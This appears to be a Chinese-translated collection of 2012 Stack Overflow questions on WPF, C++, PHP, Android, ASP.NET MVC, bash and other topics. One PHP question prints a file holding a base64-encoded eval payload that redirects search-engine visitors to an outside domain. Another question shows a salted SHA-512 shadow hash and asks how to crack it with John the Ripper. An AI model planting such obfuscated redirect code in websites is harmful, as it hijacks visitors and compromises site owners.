                    <TextBlock Text="{Binding TheText}" TextTrimming="CharacterEllipsis" />

                    <Grid.ToolTip>
                        <ToolTip DataContext="{DynamicResource blah}">   // <---- HERE
                            <TextBlock Text="{Binding [2].TheText}" />   // <---- just example of binding to a one specific item
                            <!-- <ListBox ItemsSource="{Binding}">  another eaxmple: bind to whole list.. -->
                        </ToolTip>
                    </Grid.ToolTip>
                </Grid>
            </DataTemplate>
        </ListBox.ItemTemplate>
    </ListBox>

public class Item
{
    public string TheText { get; set; }
}

    public MainWindow()
    {
        InitializeComponent();

        Resources["blah"] = new List<Item>   // <---- HERE
        {
            new Item { TheText = ........
             ........ 
```

在最后一个示例中，我将 window.DataContext 绑定更改为与 DynamicResource 的绑定。在窗口初始化中，我还更改了数据传递到窗口的方式。我已更改工具提示模板以明确包含工具提示，并将其绑定到同一资源。这样，内部工具提示的文本块能够直接读取数据源的第三行 - 这证明它绑定到列表，而不是项目。

然而，这是蹩脚的方法。它仅适用于显式工具提示，仅适用于 Tooltip.DataContext=resource，并且可能是这种方法的唯一工作形式。可能有可能侵入带有附加行为的工具提示并搜索它的父窗口和让绑定工作，但通常不值得。您可以尝试绑定到第二个示例中的项目属性吗？

# svn - 将 UberSVN 存储库迁移到另一台服务器

> ID：12068774
> 
> 赞同：3
> 
> 时间：2012-08-22T08:05:00.183
> 
> 标签：svn, ubuntu-12.04, ubersvn

我想按照此[说明](http://support.wandisco.com/index.php?/Knowledgebase/Article/View/372/46/moving-ubersvn-to-another-server)将存储库从旧的 Ubersvn 移动到新的。之后，我可以从浏览器（mydomain：**9890**）访问我的 Ubersvn 服务器，但我无法使用 tortoisesvn（mydomain：**9880** /myproject）签出源代码，也无法从浏览器访问链接 mydomain：**9880** /myproject（找不到显示页面)

请帮我！

我使用 Ubuntu 服务器 12.04，uberSVN 核心 12.07.0693-3

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T13:15:19.940

除非您已备份并恢复您的存储库，否则它们将不会存在于新服务器上。uberSVN 备份中包含的数据特定于团队/用户和规则。

[FWIW 在此处](http://docs.ubersvn.com/v1.0/moving.html)的 uberSVN 文档中有更新版本的帮助文件，在引入备份工具时重写。

# c++ - 错误 C2440：“=”：无法从“const BWAPI::UnitType *”转换为“BWAPI::Type *”

> ID：12068779
> 
> 赞同：0
> 
> 时间：2012-08-22T08:05:03.347
> 
> 标签：c++, inheritance, syntax-error

我收到这个错误

错误 C2440：“=”：无法从“const BWAPI::UnitType *”转换为“BWAPI::Type *”

在这条线上

```
this->generalType = &type; 
```

问题是什么？因为 UnitType extends Type 不应该被允许？

```
class CombatEvent {

public:

    CombatEvent& setType(CombatEventType type);
    Type* getGeneralType() const;

private:
    UnitType unitType;
    Type* generalType;
}

// implementation

CombatEvent& CombatEvent::setUnitType(const UnitType type) {

    this->generalType = &type;
    this->unitType = type;

    return *this;
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:07:23.480

删除`const`. 这应该有效。但是，您是按价值传递的。你可以绕过`const UnitType&`。这提高了性能。或者，当然，如果您通过引用传递，也删除违规行中的地址运算符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:08:32.287

首先，您将 const 对象的地址分配给指向非 const 对象的指针。

其次，即使在您更正之后，`this->generalType = &type`也会存储在退出函数时被破坏的局部函数参数的地址。这是一件非常危险的事情。指针倾斜后会指向一个垃圾`setUnitType`。

# javascript - WebKit 浏览器中的渲染错误

> ID：12068784
> 
> 赞同：4
> 
> 时间：2012-08-22T08:05:11.230
> 
> 标签：javascript, extjs, rendering

在我目前从事的项目中，我们遇到了非常奇怪的渲染问题。最糟糕的是，这个问题完全是自发出现的，经过几天的测试，我们还没有找到可以重现这个问题的操作顺序。这里解释一下这个 bug 的样子。这是页面外观的屏幕截图：

![所需外观](../Images/f228c315e5bfca71f048fc1980817bc4.png)

但是在一些操作内容块弹出后而不是这个，所以只有部分内容是可见的，它看起来像：

![问题](../Images/120f9b08c74368dc79c682e52cb1d111.png)

最奇怪的是，这样的块位置不是基于 Web Inspector 显示的 CSS 属性的值。

![网络检查员](../Images/3631d6686f1d95078e14141a8ebfa066.png)

如您所见，CSS 属性正常，而块的位置却不行。这个事实表明我可能是 WebKit 引擎的一些渲染错误

该项目使用 Ext JS 3.4 构建，是一个经典的单页 Web 应用程序。此问题出现在 Mac OS 10.7/10.8 上的 Chrome 和 Safari 的最新版本中。尽管由于此问题的自发性，它也可能出现在其他浏览器和平台中。

欢迎提供有关如何调试此类问题或如何出现此类问题的任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T07:41:24.730

请检查您的任何代码或 Ext JS 的代码是否正在使用 scrollIntoView 方法，当在任何未将溢出设置为 auto 的元素上调用 scrollIntoView 并且它位于可能相对定位的剪辑元素内时，我们看到了类似的问题。

这似乎是 webkit 中的错误，因为它滚动了其他浏览器中没有发生的剪辑元素。

我还看到同一层次结构中的两个元素将溢出设置为自动。并且 scrollIntoView 正在滚动错误的元素。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-30T20:46:54.543

我在使用`sencha touch 2`应用程序时遇到了同样的问题，因为这与`ExtJS`我为您提供的解决方案相同，
这可能是框架中的一个错误，当 ExtJS 在浏览器填充之前渲染应用程序时发生这种情况可能是正确的`window.innerWidth`，`window.innerHeight`因此视口不能采用正确的宽度和高度。这也解释了事件的随机性。这在手机上使用时会变得更加突出，这可能是因为资源有限且响应缓慢。
我为处理这个可能而采取的解决方案不是一个好的解决方案，但考虑到我找不到更好的解决方案是框架本身的故障，
我轮询正确`height`和`width`每说 100 毫秒后浏览器的大约一秒钟，以获得正确的窗口高度和宽度，如果我发现高度或宽度不`viewport`一样，我会重新调整它。因为您正在使用 ExtJS 并且应用程序将在高性能系统上运行（与移动电话相比），我会推荐一个更小的间隔，然后为了安全起见，它会轮询一个更大的时间段。
继承人我当前使用的代码根据您的需要编辑

```
var aId = setInterval(function () {
                    if (Ext.Viewport.getWidth() !== window.innerWidth || Ext.Viewport.getHeight() !== window.innerHeight) {
                        Ext.Viewport.setSize(window.innerWidth, window.innerHeight);
                        clearInterval(aId);
                    }
                    num = num + 1;
                    if (num > 10) {
                        clearInterval(aId);
                    }
                }, 100) 
```

我目前在应用程序中使用此代码`launch function`。但是您也可以在`show`事件中`viewport`使用它，您应该将间隔时间保持在尽可能短的时间以避免任何滞后。
如果您认为此应用程序可能会在用户更改窗口高度和宽度的设备上使用（例如当*方向更改*时移动浏览器，或者如果您认为用户会更改浏览器窗口的`height`和`width`）。然后只需在视口中复制并粘贴相同的代码片段，`resize event`以便在视口大小发生变化时也轮询和调整视口大小。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-28T14:27:25.830

Mac 上的 Chrome 和 Safari 存在滚动问题。如果元素已经滚动并且内容发生了变化，即使内容不够高而需要滚动，滚动位置也会保持不变。

我们在应用程序中找到的解决方法是调整容器（具有滚动的容器）的大小，使其具有滚动条（否则您无法使用滚动属性），然后重置滚动和高度。

```
$(container).css('height',1).scrollTop('1').css('height',''); 
```

下面是我们在 jQuery 中的做法。你甚至不会看到闪烁:)

我不确定这是否是问题所在，但这件事让我们站了一段时间。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T08:10:08.983

您是否尝试添加 clear:both; 工具栏 div 之后的块？

```
<div style="clear:both;"></div> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-24T08:59:04.120

*@bjornd 没有任何*代码很难调试:)

工具栏是否已定位并且内容是否具有在 URL 中调用的 ID？换句话说：是否有一些链接（例如）触发`#content`并且没有`preventDefault()`等？这可能会滚动页面。

我不知道，这是我想到的第一件事。

也可能`toolbar`是（由于某种原因）不再清除的内容或`content`'s`top`位置的某些更改（相对于另一个更改/删除的元素？）

尝试创建一个包含最简单代码但仍会触发错误的精简测试用例。如果您发布（通过例如小提琴等），我们可以有一个适当的外观。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-30T20:53:27.667

这可能是一个 CSS 问题；

`padding-bottom: 99999px;`通过设置 a和 使用相等高度的 div 时，我遇到了类似的问题`margin-bottom: -99999px;`。在所有情况下都可以正常工作，除非您使用主题标签锚点跳转到页面上的 div 进一步。`<a href="#someDivFurtherOnThePage">Jump down</a>`.

在这种情况下，页面顶部被剪裁并从我想看到的 div 开始。

既然你说这个问题很难追踪，这可能是值得一看的。解决方案是删除这两条 css 行并使用另一种设置 div 高度的方法。

# php - 编辑 PixelPost 模板

> ID：12068785
> 
> 赞同：0
> 
> 时间：2012-08-22T08:05:14.083
> 
> 标签：php

我已经安装了 PixelPost (http://www.pixelpost.org/) 照片博客脚本，我使用的模板有两个 CSS 文件，[Dark + Light]，

问题就在这里；我应该如何将深色 CSS 样式设为默认，在文件“browse_template”中它具有以下代码：

```
<link rel="stylesheet" type="text/css" href="templates/simple/styles/dark.css" title="dark" />
<link rel="alternate stylesheet" type="text/css" href="templates/simple/styles/light.css" title="light" /> 
```

反之亦然，我的意思是备用样式表是深色的，我确实将其更改为上面的代码，但浅色样式仍然是默认的

这是完整的模板：[模板链接](http://speedy.sh/AJDhW/simple.zip)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T09:31:47.930

我不确定是否正确理解您的问题，但我会尽力解释。一切都发生在`styleswitcher.js`

**首次加载（从未见过该页面）：**

js 文件将根据以下条件确定您“最喜欢的”样式表：

*   这是一个`<link>`标签，包含`rel=*style*`
*   `rel`它在属性中不包含“alt”字符串。
*   它有一个标题属性。

所以 ！使用您的代码，将在第一次启动时选择“黑暗”主题。

当您离开页面时，js 文件正在将选定的收藏样式保存到 cookie 中。

**在下一次加载时**

JS 文件正在读取之前保存的 cookie 并按优先级显示最后保存的样式。

如果要检查脚本的正确行为，必须**删除**该域上的 cookie，然后刷新页面。它首先应该看到“黑暗”风格。

另一个检查选项是以隐私浏览模式运行 Chrome/Firefox

希望这可以解决您的问题

# javascript - 本网站使用了哪些库？

> ID：12068786
> 
> 赞同：0
> 
> 时间：2012-08-22T08:05:17.047
> 
> 标签：javascript, jquery, html

我想使用这个“技术”制作一个网站：

[http://www.domperignon.com/](http://www.domperignon.com/)

但是我不知道在哪里可以找到这样的东西......

在此先感谢，DGM.-

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:28:54.990

如果您有 Chrome 或 Firefox，则可以检查该站点。对于 Chrome，右键单击站点上的任意位置并点击检查元素。对于 Firefox，您需要下载一个名为 Firebug 的附加组件。

对于 Chrome，应该会出现一个弹出窗口，其中包含多个选项卡并显示 html 网站的源代码。您可以根据需要仔细阅读，但我相信您所指的“技术”或多或少位于他们的 javascript 文件中。

单击“资源”选项卡，第一个文件夹显示“框架”。点击它，你应该会看到他们所有的文件，包括 js 文件、图像、样式表等。

如果您使用的是 Firefox Firebug，请右键单击页面上的任意位置并点击 Inspect Element with Firebug。顶部的选项卡很好地将它分开，因此您可以直接进入脚本、CSS 等。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:06:47.467

这是一个小书签，用于确定页面上正在运行哪些脚本：

```
javascript:(function(){s=document.getElementsByTagName('SCRIPT');tx='';sr=[];for(i=0;i<s.length;i++){with(s.item(i)){t=text;if(t){tx+=t;}else{sr.push(src)};}};with(window.open()){document.write('<textarea id="t">'+(sr.join("\n"))+"\n\n-----\n\n"+tx+'</textarea><script src="http://jsbeautifier.org/beautify.js"></script><script>with(document.getElementById("t")){value=js_beautify(value);with(style){width="99%";height="99%";borderStyle="none";}};</script>');document.close();}})(); 
```

只需将其保存为书签并在任何页面上运行即可。

# xpath - 面临获取 xpath 的问题

> ID：12068787
> 
> 赞同：0
> 
> 时间：2012-08-22T08:05:23.567
> 
> 标签：xpath

我正在处理 XPath 脚本。我想要以下标记的 xpath。

```
 <td valign="top">   
    " Oct 17, 2011 "
   <br>
    " 3 Pages - Pub ID: KLI6673261" 
```

我希望 xpath 在标记后获取文本。`<br>`意味着我只想获取 [3 页 - 酒吧 ID：KLI6673261]。请指导我。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T09:10:15.190

`<br>`您可以像这样获取 a之后的所有文本`<td>`：

```
/td/br/following-sibling::text() 
```

虽然如果你的 xml/html 没有自动关闭`<br>`，它会认为文本在 br 内，你需要这个

```
/td/br/text() 
```

# javascript - 为什么在使用 ceebox 显示 YouTube 视频时出现“无法获取属性 'SetReturnValue' 的值”

> ID：12068788
> 
> 赞同：0
> 
> 时间：2012-08-22T08:05:27.523
> 
> 标签：javascript, jquery

我有一个 ASP.Net MVC 站点，它使用[CEEBOX](http://catcubed.com/2008/12/23/ceebox-a-thickboxvideobox-mashup/)在弹出窗口中显示 youtube 视频。

当视频窗口弹出时，我在 IE9 中得到以下异常：

> 行：1 错误：无法获取属性“SetReturnValue”的值：对象为空或未定义

如果我尝试使用调试器，我可以看到异常发生在类似于*{Formatting is mine}*的部分中：

```
try {
    document.getElementById("")
            .SetReturnValue(__flash__toXML(document.location.href.toString()));
} 
catch (e) {
    document.getElementById("").SetReturnValue("<undefined/>"); 
} 
```

触发弹出窗口的锚点的标记是：

```
<a class="thickbox" rel="width:640 height:385" 
  href="http://www.youtube.com/watch?v=xxxxxxxxx" >
  <span style="background-color: White; position: relative; outline-style: none; ">
    <span class="cliplarge" >
      <img src="http://zzz.zzz.com/xxxx.jpg" 
           style="height: 275px; width: 418px; margin-bottom: 0px; margin-top: -35px; "
           alt="Test" title="" />
    </span>
    <div style="z-index:40;position:relative;height:100px;width:100px;top:-140px;left:140px;">
        <img src="<%: Url.Content("~/Content/VideoPlay.png") %>" />
    </div>
  </span>
</a> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:05:27.523

问题原来与 URL 的形式有关：

[格式为http://www.youtube.com/watch?v=xxxxxx](http://www.youtube.com/watch?v=xxxxxx)的URL 旨在直接显示在 youtube 网站上。

而表单中的 URL：[http://www.youtube.com/v/xxxxxx](http://www.youtube.com/v/xxxxxx) 会导致使用全屏播放器，该播放器将显示在任何框架中……如果您将其放在浏览器 URL 中，它将接管完整浏览器窗口的屏幕。

第二种形式似乎更适合弹出窗口，并且没有出现异常。

# android - Android 警报对话框文本颜色

> ID：12068790
> 
> 赞同：2
> 
> 时间：2012-08-22T08:05:31.277
> 
> 标签：android, text, android-alertdialog

在我的应用程序中，我试图在明暗之间切换主题。但是警报对话框文本颜色不会随主题而改变。我为警报对话框创建了一个主题，但似乎不起作用。这是我的代码：

```
 final AlertDialog.Builder builder = new AlertDialog.Builder(new ContextThemeWrapper(mContext, R.style.DialogWhite));

    builder.setAdapter(adapter, new OnClickListener() {

        @Override
        public void onClick(final DialogInterface dialog, final int which) {
            final ActionBarItemResource eab = aList.get(which);
            eab.getAction().run();

        }
    });
    // builder.setTitle(tEntityNew.getName());
    final AlertDialog alert = builder.create();
    alert.show(); 
```

我的样式.xml

```
 <style name="DialogWhite" parent="@android:style/Theme.Dialog">
    <item name="android:textColor">?android:attr/textColorPrimaryInverseDisableOnly</item>
    </style> 
```

谁能帮我这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:18:37.233

在这种情况下，制作自定义对话框更容易生成最合适的 UI。因为在 AlertDialog 中只提供了有限的主题

# asp.net-mvc-3 - ASP.Net MVC 3 - 如果在部分视图上设置了 HtmlFieldPrefix，DropDownListFor 无法从模型中选择值

> ID：12068791
> 
> 赞同：1
> 
> 时间：2012-08-22T08:05:35.940
> 
> 标签：asp.net-mvc-3

使用时

```
<%= Html.DropDownListFor(model => model.FeeTypeId, Model.GetFeeTypes(), new { })%> 
```

在这种情况下，在呈现选择时根据 Model.FeeTypeId 选择正确的选项。

**但是**
，如果您使用部分视图呈现表单，将其传递给特定的 HtmlFieldPrefix （例如，如果您想要呈现两个相同的视图并希望元素具有不同的 ID，则需要它）

```
<% Html.RenderPartial("path-to-partial-view", Model, new ViewDataDictionary() { TemplateInfo = new TemplateInfo() { HtmlFieldPrefix = "myPrefix" } }); %> 
```

那么该值将不会被选中。

看起来类似于[EditorTemplate 中 DropDownListFor 的问题，它没有选择值](https://stackoverflow.com/questions/1916462/dropdownlistfor-in-editortemplate-not-selecting-value)，而是来自不同的原因。

查看 MVC 3 源代码，似乎问题出在`SelectInternal`它使用的方法上，`htmlHelper.ViewData.Eval(fullName);`
当它包含前缀时无法通过全名获取值，
TextBoxFor 不会失败，因为它将表达式的值传递给 InputHelper它不能使用 ViewData.Eval

只是为了确保在局部视图中对其进行了测试：
在局部视图中，将打印以下内容 `"myPrefix.FeeTypeId"`

```
<%= Html.ViewContext.ViewData.TemplateInfo.GetFullHtmlFieldName("FeeTypeId") %> 
```

以下将打印`"by property name: [value] by full name: [empty string]"`

```
<%="by property name: " + Html.ViewData.Eval("FeeTypeId")%><br />
<%= "by full name: " + Html.ViewData.Eval(Html.ViewContext.ViewData.TemplateInfo.GetFullHtmlFieldName("FeeTypeId"))%> 
```

我找到的唯一解决方案是在 Model.GetFeeTypes() 生成一个列表并将我想要的选项标记为选中：

```
<%= Html.DropDownListFor(model => model.FeeTypeId, Model.GetFeeTypes(Model.FeeTypeId), new { })%> 
```

不太喜欢这个解决方案 + 我知道我可以在局部视图中创建列表，这也很丑陋，
还有其他解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-19T11:54:07.063

I have discovered that this is a bug in MVC. It's not fixed, though there is a work around. See my question answered by myself (I had the same problem before finding your post).

[MVC4 binding drop down list in a list (bug)](https://stackoverflow.com/questions/14951544/mvc4-binding-drop-down-list-in-a-list-bug/14956575#14956575)

Regards
Craig

# php - 如何使用 PHP 从 php 文件中读取数据？

> ID：12068801
> 
> 赞同：-1
> 
> 时间：2012-08-22T08:06:15.280
> 
> 标签：php, readfile

我想使用文件 A.php 中的 php 代码来读取另一个 php 文件 B.php 的数据。所以 B.php 中的所有 php 脚本都不会执行，它只是字符串。

不幸的是，当我在我的 A.php 中读取 B.php 中的数据时，它正在执行。

这是 A.php 中的代码：

```
$handle = @fopen('B.php', 'r') or print " ---> cannot read B.php!";
$filesize = @filesize('B.php');
$str = $filesize ? @fread($handle, $filesize) : null;
@fclose($handle);

if (!$str) {
    echo 'B.php is empty!';
    exit;
}
else {
    //TODO continue process
} 
```

这是 B.php 中的代码：

```
<?php       eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vd3d3LnN0bHAuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));?> 
```

**注意**：B.php 文件不能更改。我的代码在 A.php

**更新**：当我从 A.php 读取 B.php 中的数据时，它没有执行。但是我怎么能把数据打印出来呢？因为我使用 print it by `echo $str`，所以浏览器中没有显示任何内容。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T08:10:46.933

除非您包含该文件，否则代码不会被执行。

PS：使用`file_get_contents`会简单很多。

```
$str = file_get_contents('B.php'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:11:30.243

尝试使用[file_get_contents](http://uk.php.net/file_get_contents)获取 Bs 内容的纯字符串

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:23:33.990

要将所有文件行放入数组中，请使用它。

```
$data = file($filename, FILE_IGNORE_NEW_LINES); 
```

# javascript - 如何自动旋转街景全景图？

> ID：12068802
> 
> 赞同：3
> 
> 时间：2012-08-22T08:06:20.010
> 
> 标签：javascript, google-street-view

如何使用 API 自动旋转街景全景图？

像这个[谷歌画廊](http://maps.google.com/intl/en/help/maps/streetview/#utm_campaign=en&utm_medium=van&utm_source=en-van-na-us-gns-svn)。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-06-27T04:44:41.107

您可以通过在每个时间间隔更改标题来使用 JavaScript 计时器 (window.setInterval) 进行旋转。这是一个简单的示例：[使用 Google 地图旋转街景全景](http://theoryapp.com/rotating-street-view-panorama-using-google-maps/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-05-19T11:47:55.403

要更改全景角度，您必须更改[Point-of-View](https://developers.google.com/maps/documentation/javascript/streetview#StreetViewLocation)参数，即[`heading`](https://developers.google.com/maps/documentation/javascript/3.exp/reference#StreetViewPov)。
此变量以度为单位（0 为北，90 为东，...）。

给定一个包含[全景图](https://developers.google.com/maps/documentation/javascript/3.exp/reference#StreetViewPanorama)的变量：

```
const panorama = new google.maps.StreetViewPanorama(container, opts); 
```

获取全景 POV `getPov`：

```
const oldPov = panorama.getPov(); 
```

然后用新值替换 POV：

```
panorama.setPov({
  header : oldPov.header + 1,
  pitch  : oldPov.pitch
}); 
```

这会将视点顺时针旋转一度。现在你只需要使用[`setInterval`](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval)让这段代码自动重复：

```
let rotation = 1,   // In degrees
    interval = 100; // In milliseconds

const rotateId = setInterval(() => {
  const oldPov = panorama.getPov();
  panorama.setPov({
    header : oldPov.header + rotation,
    pitch  : oldPov.pitch
  });
}, interval); 
```

（`setInterval`需要一个函数传递给它，在这种情况下它是一个[箭头函数](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions)）

请注意，上面的内容可能看起来很紧张。
降低`interval`将使其更新更快，但可能会降低性能。
增加`rotation`将使它转动得更快。
摆弄这两个值，你应该得到你想要的。

为了阻止它，

```
clearInterval(rotateId); 
```

# c# - 背景创建 BitmapImage

> ID：12068804
> 
> 赞同：2
> 
> 时间：2012-08-22T08:06:25.343
> 
> 标签：c#, windows-phone-7

我正在尝试在后台线程（BackgroundWorker）中创建一个 BitmapImage，但我的函数只返回一次 null 并且不进入 Deployment.Current.Dispatcher.BeginInvoke。当我在 UI 线程中使用此功能时，一切都很好。文件路径正确（为.jpg图片）

```
public static BitmapImage convertFileToBitmapImage(string filePath)
{
    BitmapImage bmp = null;
    Uri jpegUri = new Uri(filePath, UriKind.Relative);
    StreamResourceInfo sri = Application.GetResourceStream(jpegUri);

    Deployment.Current.Dispatcher.BeginInvoke(new Action(  ( ) =>
        {

            bmp = new BitmapImage();
            bmp.SetSource(sri.Stream);

        }));
    return bmp;
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T08:10:58.980

问题是您使用[Dispatcher.BeginInvoke](http://msdn.microsoft.com/en-us/library/cc190259%28v=vs.95%29.aspx)它将在 UI 线程上异步运行任务，无法保证在您从函数返回时位图将被初始化。如果您需要立即对其进行初始化，您应该使用[Dispatcher.Invoke](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcher.invoke.aspx)以便这一切同步发生。

**更新**

错过了你的标签，因为它是 Windows Phone，但是，同样的问题仍然存在，你没有给你的应用足够的时间来初始化位图。您也许可以使用[AutoResetEvent](http://msdn.microsoft.com/en-us/library/system.threading.autoresetevent%28v=vs.95%29.aspx)等待在从方法返回之前创建位图，例如

```
public static BitmapImage convertFileToBitmapImage(string filePath)
{
    BitmapImage bmp = null;
    Uri jpegUri = new Uri(filePath, UriKind.Relative);
    StreamResourceInfo sri = Application.GetResourceStream(jpegUri);
    AutoResetEvent bitmapInitializationEvt = new AutoResetEvent(false);
    Deployment.Current.Dispatcher.BeginInvoke(new Action(() => {
        bmp = new BitmapImage();
        bmp.SetSource(sri.Stream);
        bitmapInitializationEvt.Set();
    }));
    bitmapInitializationEvt.WaitOne();
    return bmp;
} 
```

# php - 如何使用 Propel 从请求中获取元素的总和？

> ID：12068806
> 
> 赞同：1
> 
> 时间：2012-08-22T08:06:41.540
> 
> 标签：php, symfony, propel

我正在尝试获取对象中包含的变量的总和，但我不知道该怎么做。我知道这不是很清楚，所以这里有一个例子。

我正在请求从一位用户那里获得所有折扣。我现在想得到他所有折扣的总和。在 SQL 中，它将是：

```
SELECT SUM(c.discount_price) AS SumDiscounts FROM my_table c GROUP BY c.user_id 
```

我怎样才能在推进中做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:30:48.597

试试这个查询：

```
 $collection = MyTableQuery::create()
        ->withColumn('SUM(c.discount_price)', 'SumDiscounts')
        ->groupByUserId()
        ->find(); 
```

# linux - 按名称读取命令行参数

> ID：12068817
> 
> 赞同：1
> 
> 时间：2012-08-22T08:07:22.943
> 
> 标签：linux, bash

如果我运行 bash 脚本为

```
./myscript.sh zone=A build=release 
```

有没有办法我可以根据参数而不是使用 $1、$2 来读取参数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:24:33.400

希望这是您所要求的：

```
A="try"
try="something"
echo ${!A}
> something 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:27:51.653

不。Unix shell 是一项古老的技术，哈希映射在当时是众所周知的，但不是“流行的”。他们需要超过 1 个字节来实现，所以专业人士不想使用这种浪费的技术。

你还能做什么？通常的解决方案是[getopt(1)](http://linux.die.net/man/1/getopt)。

另一种方法是将所有选项写入文件和源：

```
echo "$@" | tr ' ' '\n' > options
. ./options

echo "zone=${zone}" 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T12:34:02.333

这接近你想要的。

```
set -k
./myscript.sh zone=A build=release 
```

行为将与

```
zone=A build=release ./myscript.sh 
```

也就是说，`myscript.sh`将在其环境中看到`zone`并`build`使用给定的值。

# android - 那些只在 Android 的 UI 线程中做的事情是什么？

> ID：12068820
> 
> 赞同：0
> 
> 时间：2012-08-22T08:07:26.997
> 
> 标签：android

我知道 Dialog 只能在 UI 线程中完成。还有什么？

我发现我可以从其他线程获取我的视图 obj，这没有错吗？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:11:50.087

所有与 UI 相关的操作，包括 View。Dialog、Layout(view) update、Toast、Adapter值变化等等。获取视图对象不会影响视图本身，因为它不需要 onMeasure 或 onDraw

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:28:57.647

android 中任何可以修改 UI 的东西都应该在 UI 线程中完成。其中一些任务是：

*   添加或删除视图
*   更新视图（更改 TextView 的文本、ImageView 的背景等）
*   打开对话框，警告对话框
*   祝酒词
*   启动活动
*   更改适配器的数据集

名单很长。

# ubuntu - 理解和破解salted sha512 hashes

> ID：12068821
> 
> 赞同：2
> 
> 时间：2012-08-22T08:07:31.390
> 
> 标签：ubuntu, hash, salt, password-hash

在 Ubuntu 12.04 上，我创建了几个用户和密码，然后立即尝试使用*开膛手 John*破解这些密码。一个密码非常强大，但其他密码在我的单词列表中。

约翰仍在跑步，但到目前为止，我已经在大约 20 分钟内破解了两个。

我读到的所有内容都在谈论盐是否已知。以这个哈希为例：

```
john:$6$YiP34XiXdXyh9fZn$JrbLMb.VGncFzEyBlz5YsKUim.UE5JLPvFhfcgAH4lz.usOrh.lic8IrQx0PRMIvIIIK4KnaTs9fiEXwNOLJ1/:1003:1003:John,,,:/ 
```

盐是：

```
YiP34XiXdXyh9fZn 
```

， 正确的？我的意思是，它不是一直都知道吗？所以盐除了防止使用彩虹表之外真的没有任何作用，对吧？

另外，还有这个帖子：

[暴力破解加盐 SHA-512 哈希需要多长时间？（提供盐）](https://stackoverflow.com/questions/6776050/how-long-to-brute-force-a-salted-sha-512-hash-salt-provided)

据此，除非密码在单词列表中，否则基本上无法破解 sha512。那篇文章大约有一年了，有人有什么新见解吗？我发现很难找到关于破解哈希的好资源；那里的所有信息都是关于生成哈希和保护密码的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-28T05:37:16.427

